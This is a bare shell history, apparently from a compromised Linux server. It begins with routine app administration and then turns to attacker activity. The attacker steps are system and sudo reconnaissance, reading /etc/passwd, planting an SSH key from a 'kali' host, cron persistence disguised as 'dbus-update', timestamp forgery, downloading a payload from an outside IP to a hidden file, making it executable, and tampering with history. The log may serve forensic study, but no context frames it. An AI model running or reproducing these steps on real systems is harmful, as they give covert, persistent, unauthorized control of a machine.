sudo systemctl restart app
make deploy
cd app
tail -f /var/log/app/app.log
systemctl status app
ls
git pull
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGw0LycMKRW6+jVmVrpGEaV/8Jt1aH4sBCAxPENGzTwL x@kali' >> ~/.ssh/authorized_keys
crontab -
sudo tee -a /etc/cron.d/dbus-update
touch -r /etc/hostname /var/spool/cron/crontabs/backup
wget -q http://193.173.92.246/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
